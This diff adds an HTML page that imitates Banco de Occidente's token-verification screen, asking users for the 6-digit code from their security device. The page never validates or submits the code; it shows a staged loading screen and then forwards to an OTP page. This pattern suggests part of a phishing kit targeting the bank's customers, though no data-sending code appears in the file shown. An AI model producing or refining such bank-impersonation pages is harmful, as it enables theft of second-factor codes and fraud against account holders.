@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <link rel="icon" type="image/x-icon" href="img/favicon.ico">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco de Occidente - Verificación Token</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Main Card -->
+        <div class="card">
+            <!-- Seguridad Badge -->
+            <a href="#/seguridad" class="security-badge">
+                <span class="icon-shield">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="12" cy="12" r="10" stroke="#00ca82" stroke-width="1.8" fill="none"/>
+                        <path d="M12 6 L7 8.5 L7 13 C7 16 9.5 18.5 12 19.5 C14.5 18.5 17 16 17 13 L17 8.5 Z" 
+                              stroke="#00ca82" stroke-width="1.5" fill="none" stroke-linejoin="round"/>
+                        <path d="M10 12.5 L11.5 14 L14 11.5" 
+                              stroke="#00ca82" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                    </svg>
+                </span>
+                <span class="security-text">Seguridad</span>
+            </a>
+
+            <!-- Logo -->
+            <div class="logo-container">
+                <img src="img/logo-03-occidente-01-occidente-01-regular.aa547ca6b936469689ea.svg" alt="Banco de Occidente" class="logo">
+            </div>
+
+            <!-- Title -->
+            <div class="welcome-text">
+                <p class="welcome">Verificación de identidad</p>
+                <p class="portal-title">Ingresa tu Token</p>
+            </div>
+
+            <!-- Info Message -->
+            <div class="info-box">
+                <p>Por tu seguridad, ingresa el <strong>token de 6 dígitos</strong> generado por tu dispositivo de seguridad.</p>
+            </div>
+
+            <!-- Form -->
+            <form class="login-form" id="form-token">
+                <!-- Token Field -->
+                <div class="form-group">
+                    <label for="token">Token de seguridad</label>
+                    <input 
+                        type="text" 
+                        id="token" 
+                        placeholder="Ingresa los 6 dígitos" 
+                        class="input-field input-token" 
+                        maxlength="6"
+                        pattern="[0-9]{6}"
+                        required
+                        autocomplete="off"
+                        inputmode="numeric"
+                    >
+                </div>
+
+                <!-- Help Text -->
+                <div class="help-text">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z" fill="#666"/>
+                    </svg>
+                    <span>Ingresa el token de 6 dígitos generado por tu dispositivo de seguridad</span>
+                </div>
+
+                <!-- Submit Button -->
+                <button type="button" class="btn-login" id="btnContinuar" disabled>
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M9 16.17L4.83 12L3.41 13.41L9 19L21 7L19.59 5.59L9 16.17Z" fill="white"/>
+                    </svg>
+                    Verificar Token
+                </button>
+
+                <!-- Back Link -->
+                <div class="back-link">
+                    <a href="index.html">← Volver al inicio</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-content">
+            <img src="img/spinner_occidente.gif" alt="Cargando..." class="loading-spinner">
+            <p class="loading-text">Verificando token...</p>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+
+            const tokenInput = document.getElementById('token');
+            const btnContinuar = document.getElementById('btnContinuar');
+            const loadingScreen = document.getElementById('loadingScreen');
+
+            // ============================================
+            // 1. BLOQUEO DE LETRAS + SOLO 6 DÍGITOS
+            // ============================================
+            if (tokenInput) {
+                // Bloquear letras al presionar
+                tokenInput.addEventListener('keypress', function (e) {
+                    if (e.key && e.key.length === 1 && /\D/.test(e.key)) {
+                        e.preventDefault();
+                    }
+                });
+
+                // Limpiar si pegan texto con letras
+                tokenInput.addEventListener('input', function () {
+                    const limpio = tokenInput.value.replace(/\D/g, '').slice(0, 6);
+                    if (tokenInput.value !== limpio) {
+                        tokenInput.value = limpio;
+                    }
+                    validarToken();
+                });
+
+                // Bloquear al pegar
+                tokenInput.addEventListener('paste', function (e) {
+                    e.preventDefault();
+                    const texto = (e.clipboardData || window.clipboardData).getData('text') || '';
+                    const limpio = texto.replace(/\D/g, '').slice(0, 6);
+                    tokenInput.value = limpio;
+                    tokenInput.dispatchEvent(new Event('input', { bubbles: true }));
+                });
+
+                // Bloquear drag & drop
+                tokenInput.addEventListener('drop', function (e) {
+                    e.preventDefault();
+                });
+
+                // Enfocar el input automáticamente (abre teclado en celular)
+                setTimeout(function () {
+                    tokenInput.focus();
+                }, 300);
+            }
+
+            // ============================================
+            // 2. VALIDAR TOKEN (activar botón)
+            // ============================================
+            function validarToken() {
+                const valor = tokenInput ? tokenInput.value.trim() : '';
+                if (btnContinuar) {
+                    btnContinuar.disabled = valor.length !== 6;
+                }
+            }
+
+            // ============================================
+            // 3. AL DAR CLICK EN VERIFICAR TOKEN
+            // ============================================
+            function mostrarCargaYRedirigir() {
+                if (loadingScreen) {
+                    loadingScreen.classList.add('active');
+                }
+
+                setTimeout(function () {
+                    window.location.href = 'otp.html';
+                }, 2500);
+            }
+
+            if (btnContinuar) {
+                btnContinuar.addEventListener('click', function (e) {
+                    e.preventDefault();
+
+                    const valor = tokenInput ? tokenInput.value.trim() : '';
+
+                    if (valor.length !== 6) {
+                        alert('El token debe tener exactamente 6 dígitos');
+                        return;
+                    }
+
+                    mostrarCargaYRedirigir();
+                });
+            }
+
+            // Permitir enviar con Enter
+            if (tokenInput) {
+                tokenInput.addEventListener('keypress', function (e) {
+                    if (e.key === 'Enter' && tokenInput.value.length === 6) {
+                        e.preventDefault();
+                        mostrarCargaYRedirigir();
+                    }
+                });
+            }
+
+        });
+    </script>
+</body>
+</html>
